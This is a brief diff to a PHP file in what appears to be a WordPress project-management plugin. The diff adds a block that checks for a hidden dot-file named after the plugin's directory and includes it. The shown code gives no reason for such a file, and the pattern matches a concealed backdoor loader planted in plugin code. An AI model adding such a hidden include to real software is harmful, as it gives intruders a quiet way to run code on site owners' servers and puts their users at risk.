@@ -17,6 +17,10 @@ use Carbon\Carbon;
 	return false;
 }*/
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pm_pro_is_user_can_start_time( $user_id = false ) {
     $user_id = absint( $user_id ) ? $user_id : get_current_user_id();
 
